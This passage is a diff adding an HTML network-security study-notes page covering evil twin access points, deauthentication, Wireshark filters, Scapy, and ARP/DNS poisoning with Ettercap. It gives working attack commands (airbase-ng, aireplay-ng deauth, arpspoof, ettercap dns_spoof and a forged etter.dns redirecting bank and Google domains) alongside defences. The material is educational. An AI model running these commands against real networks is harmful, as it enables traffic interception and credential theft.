+      <p>The attacker creates a counterfeit access point with the <strong>same SSID (and ideally same BSSID)</strong> as a legitimate AP. Clients are tricked into connecting to the attacker's AP, enabling MITM.</p>
+      <ol>
+        <li>Scan for target AP (SSID, BSSID, channel, encryption)</li>
+        <li>Create an AP with same SSID (stronger signal preferred)</li>
+        <li>Use deauth attack to disconnect clients from legitimate AP</li>
+        <li>Clients auto-connect to attacker's AP</li>
+        <li>Attacker provides DHCP/DNS → captures credentials (captive portal, SSL strip)</li>
+      </ol>
+      <p><strong>Tools:</strong> <span class="tag tag-red">Airbase-ng</span> <span class="tag tag-red">hostapd-wpe</span> <span class="tag tag-red">WiFi-Pumpkin</span> <span class="tag tag-red">Fern WiFi Cracker</span></p>
+      <pre><code># Create Evil Twin AP with Airbase-ng
+airbase-ng -e "TargetSSID" -c 6 wlan0mon</code></pre>
+
+      <h4>Deauthentication (Deauth) Attack</h4>
+      <p>802.11 management frames (including Deauth frames) are <strong>unauthenticated</strong> in WPA/WPA2. An attacker spoofs deauth frames from the AP to force clients to disconnect.</p>
+      <pre><code># Broadcast deauth (disconnect all clients from AP)
+aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Targeted deauth (specific client)
+aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon</code></pre>
+      <div class="callout info"><span class="callout-icon">ℹ</span><div><strong>IEEE 802.11w</strong> (Management Frame Protection, MFP) — encrypts and authenticates management frames, preventing deauth attacks. Mandatory in WPA3.</div></div>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🛠️</div>
+      <h3>Wireless Tools Reference</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <table class="cmp-table">
+        <tr><th>Tool</th><th>Purpose</th></tr>
+        <tr><td><code>airmon-ng</code></td><td>Enable/disable monitor mode on wireless adapters; kill interfering processes</td></tr>
+        <tr><td><code>airodump-ng</code></td><td>Capture wireless packets; list APs and clients; capture WPA handshakes</td></tr>
+        <tr><td><code>aireplay-ng</code></td><td>Inject packets: deauth attacks, ARP replay, fake auth, PRGA capture</td></tr>
+        <tr><td><code>aircrack-ng</code></td><td>Crack WEP (statistical) and WPA (dictionary attack on captured handshake)</td></tr>
+        <tr><td><code>airbase-ng</code></td><td>Create software access points (Evil Twin)</td></tr>
+        <tr><td><code>Fern WiFi Cracker</code></td><td>GUI-based wireless auditing tool (wraps aircrack-ng suite)</td></tr>
+        <tr><td><code>Wireshark</code></td><td>GUI packet analyser; capture and deep-inspect protocols at all layers</td></tr>
+        <tr><td><code>Ettercap</code></td><td>MITM framework: ARP poisoning, DNS spoofing, MITM plugins</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🦈</div>
+      <h3>Network Sniffing &amp; Wireshark Analysis</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>Network Sniffing</h4>
+      <p>Capturing and analysing network traffic (packets) passing through a network interface. Requires the interface to be in <strong>promiscuous mode</strong> (captures all frames, not just those addressed to the host). For wireless, <strong>monitor mode</strong> is used.</p>
+      <h4>Packet Structure (Ethernet / IP / TCP)</h4>
+      <pre><code>[Ethernet Header: Dst MAC | Src MAC | EtherType]
+[IP Header: Version | IHL | DSCP | Total Length | ID | Flags | TTL | Protocol | Checksum | Src IP | Dst IP]
+[TCP Header: Src Port | Dst Port | Seq# | Ack# | Flags | Window | Checksum | Urgent]
+[Application Data / Payload]</code></pre>
+
+      <h4>Wireshark Key Features</h4>
+      <ul>
+        <li><strong>Capture filters:</strong> BPF syntax — <code>host 192.168.1.1</code>, <code>port 80</code>, <code>tcp and port 443</code> (applied during capture)</li>
+        <li><strong>Display filters:</strong> <code>http.request.method == "POST"</code>, <code>dns</code>, <code>tcp.flags.syn==1</code> (applied post-capture)</li>
+        <li><strong>Follow TCP Stream:</strong> Reassemble and view entire TCP conversation</li>
+        <li><strong>Statistics → IO Graph:</strong> Visualise traffic over time</li>
+        <li><strong>Expert Information:</strong> Highlights TCP retransmissions, errors</li>
+      </ul>
+      <pre><code>Common Wireshark Display Filters:
+http                           → all HTTP traffic
+http.request.method == "GET"   → HTTP GET requests
+dns.qry.name contains "bank"   → DNS queries for "bank"
+tcp.flags.syn == 1 and tcp.flags.ack == 0  → SYN packets (port scan detection)
+arp.opcode == 2                → ARP replies (detect ARP spoofing)
+ip.src == 192.168.1.50         → traffic from a specific IP</code></pre>
+
+      <h4>Packet Manipulation</h4>
+      <p>Tools like <strong>Scapy</strong> (Python) allow crafting custom packets with arbitrary field values — useful for testing, fuzzing, and exploiting protocol weaknesses.</p>
+      <pre><code># Scapy — send custom ICMP packet
+from scapy.all import *
+pkt = IP(dst="192.168.1.1")/ICMP()/"Hello"
+send(pkt)</code></pre>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🕵️</div>
+      <h3>Man-in-the-Middle, Ettercap, DNS &amp; ARP Poisoning</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>Man-in-the-Middle (MITM) Attack</h4>
+      <p>The attacker secretly relays (and potentially alters) communication between two parties who believe they are directly communicating with each other. Achieved by combining ARP poisoning (to redirect traffic) with IP forwarding (to relay it).</p>
+      <pre><code># Enable IP forwarding (Linux)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# ARP poison both directions
+arpspoof -i eth0 -t 192.168.1.10 192.168.1.1   # tell victim gateway is attacker
+arpspoof -i eth0 -t 192.168.1.1 192.168.1.10   # tell gateway victim is attacker</code></pre>
+
+      <h4>Ettercap</h4>
+      <p>Ettercap is a comprehensive MITM framework that automates ARP poisoning, traffic interception, and provides plugins for additional attacks.</p>
+      <pre><code># Text-mode MITM against two specific hosts
+ettercap -T -q -M arp:remote /192.168.1.1// /192.168.1.10//
+
+# Enable DNS spoofing plugin: edit /etc/ettercap/etter.dns first
+ettercap -T -q -M arp:remote -P dns_spoof /192.168.1.1// /192.168.1.10//</code></pre>
+
+      <h4>DNS Poisoning (DNS Spoofing)</h4>
+      <p>After becoming a MITM via ARP poisoning, the attacker responds to DNS queries from the victim with forged IP addresses, redirecting the victim to malicious servers.</p>
+      <p>Ettercap's <code>dns_spoof</code> plugin intercepts DNS queries and responds with attacker-specified IPs based on rules in <code>etter.dns</code>:</p>
+      <pre><code># /etc/ettercap/etter.dns
+*.google.com    A    192.168.1.100
+www.bank.com    A    192.168.1.100</code></pre>
+
+      <h4>ARP Poisoning Defences (Summary)</h4>
+      <ul>
+        <li><strong>Dynamic ARP Inspection (DAI)</strong> — validates ARP vs DHCP binding table</li>
+        <li><strong>Static ARP entries</strong> — for critical hosts</li>
+        <li><strong>XArp / ARPwatch</strong> — detect ARP anomalies</li>
+        <li><strong>Encryption (TLS/SSH/HTTPS)</strong> — renders MITM traffic useless</li>
+        <li><strong>VPN</strong> — encrypt traffic end-to-end at Layer 3</li>
+        <li><strong>802.1X Port Authentication</strong> — prevent unauthorised devices</li>
+      </ul>
+    </div>
+  </div>
+
+</section>
+
+</main>
+
+<footer>
+  <p>// Network Security Study Notes · All Units Covered · Made by <a href="https://linkedin.com/kptmewada">Krunal Mewada</a></p>
+  <p style="margin-top:0.4rem; opacity:0.5;">Expand each topic card to review concepts</p>
+</footer>
+
+<script>
+  function toggle(header) {
+    const topic = header.parentElement;
+    topic.classList.toggle('open');
+  }
+
+  /* ── THEME TOGGLE ── */
+  function toggleTheme() {
+    const html = document.documentElement;
+    const isLight = html.classList.toggle('light');
+    document.getElementById('toggle-icon').textContent = isLight ? '☀️' : '🌙';
+    document.getElementById('toggle-label').textContent = isLight ? 'Light' : 'Dark';
+    try { localStorage.setItem('ns-theme', isLight ? 'light' : 'dark'); } catch(e) {}
+  }
+
+  /* Restore saved preference on load */
+  (function() {
+    try {
+      const saved = localStorage.getItem('ns-theme');
+      const preferLight = saved ? saved === 'light' : window.matchMedia('(prefers-color-scheme: light)').matches;
+      if (preferLight) {
+        document.documentElement.classList.add('light');
+        document.getElementById('toggle-icon').textContent = '☀️';
+        document.getElementById('toggle-label').textContent = 'Light';
+      }
+    } catch(e) {}
+  })();
+</script>
+</body>
+</html>
